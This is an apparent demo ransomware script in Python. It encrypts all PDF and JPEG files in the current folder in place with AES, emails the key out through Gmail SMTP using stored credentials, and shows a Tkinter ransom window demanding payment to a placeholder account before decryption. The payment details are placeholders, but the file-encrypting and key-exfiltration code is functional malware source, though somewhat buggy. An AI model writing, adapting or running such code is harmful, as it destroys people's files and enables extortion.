import smtplib
from email.message import EmailMessage
import os
import glob
from Cryptodome.Cipher import AES
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import stegano
from stegano import lsb
import tkinter as tk
from tkinter import messagebox
import shutil
filename = "EmailInfo.txt"

# Open the file in read mode
with open(filename, "r") as file:
    # Read the first line as email
    email = file.readline().strip()

    # Read the second line as password
    password = file.readline().strip()

# SMTP server details for Gmail
smtp_server = "smtp.gmail.com"
smtp_port = 587
smtp_username = email
smtp_password = password

# Encryption key
encryption_key = os.urandom(16)
encryption_key_str = encryption_key.hex()

# Create AES cipher
backend = default_backend()
cipher = Cipher(algorithms.AES(encryption_key), modes.ECB(), backend=backend)

# Find PDF and JPEG files
files = glob.glob("*.pdf") + glob.glob("*.jpeg")

# Encrypt and replace files
for file in files:
    # Read file content
    with open(file, "rb") as f:
        file_content = f.read()

    # Encrypt file content
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_content = padder.update(file_content) + padder.finalize()
    encrypted_content = encryptor.update(padded_content) + encryptor.finalize()

    # Replace file with encrypted content
    with open(file, "wb") as f:
        f.write(encrypted_content)

    # Set encrypted content as body of email
    msg = EmailMessage()
    msg.set_content(base64.b64encode(encrypted_content).decode('utf-8'))

    # Set the subject and recipient of the email
    msg['Subject'] = f"Encrypted file: {file}"
    msg['From'] = smtp_username
    msg['To'] = email
    msg.set_content(encryption_key_str)

    # Connect to SMTP server and send message
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.send_message(msg)

def decrypt_files(key):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=backend)
    
    # Find encrypted files
    encrypted_files = glob.glob("*.pdf") + glob.glob("*.jpeg")
    
    # Decrypt replace files
    for file in encrypted_files:
        # Read encrypted file content
        with open(file, "rb") as f:
            encrypted_content = f.read()
        
        # Decrypt file content
        decryptor = cipher.decryptor()
        decrypted_content = decryptor.update(encrypted_content) + decryptor.finalize()
        
        # Remove padding
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        unpadded_content = unpadder.update(decrypted_content) + unpadder.finalize()
        
        # Replace encrypted file with decrypted content
        with open(file, "wb") as f:
            f.write(unpadded_content)

# Function to handle decryption
def handle_decryption():
    # Get input from entry field
    decryption_key = entry.get()

    # Check if decryption key matches
    if decryption_key == encryption_key_str:
        decrypt_files(encryption_key)
        messagebox.showinfo("Congratulations", "Ding dong your money is gone...but your files are back to normal.\nHave a noice day :)")
    else:
        messagebox.showerror("Error!", "Wrong password buddy.")

# Create pop-up window
window = tk.Tk()
window.title("Decryption Key")
window.geometry("300x200")

# Create label and entry field for decryption key
label = tk.Label(window, text="Your pdfs and photos have been taken\nhostages. Send money to this account\n'pretend_this_is_a_bank_account' and\na password will be sent to you.\n\n Enter password:")
label.pack()
entry = tk.Entry(window, show="*")
entry.pack()

# Create a button to trigger decryption
button = tk.Button(window, text="Decrypt", command=handle_decryption)
button.pack()
